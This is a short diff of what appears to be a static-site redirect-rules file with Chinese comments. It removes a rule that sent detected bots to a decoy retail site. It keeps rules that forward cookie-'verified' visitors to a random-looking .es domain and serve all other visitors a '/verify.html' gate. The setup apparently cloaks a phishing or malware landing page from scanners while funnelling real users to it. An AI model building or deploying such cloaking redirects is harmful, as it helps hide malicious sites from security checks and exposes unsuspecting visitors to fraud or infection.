@@ -1,10 +1,6 @@
-# 规则1：Bot Fight Mode 检测到的机器人直接拦截
-/*    https://brooklynindustries.com    302
-! Header: Bot-Fight-Mode: detected
-
-# 规则2：已通过验证的用户跳转目标网站
+# 规则1：已通过验证的用户跳转目标站
 /*    https://je6.jqnmbdbsmuh.es/WqCVRYD/:splat    302
 ! Cookie: cf_verified=1
 
-# 规则3：其他请求返回验证页
+# 规则2：其他所有请求返回验证页
 /*    /verify.html    200
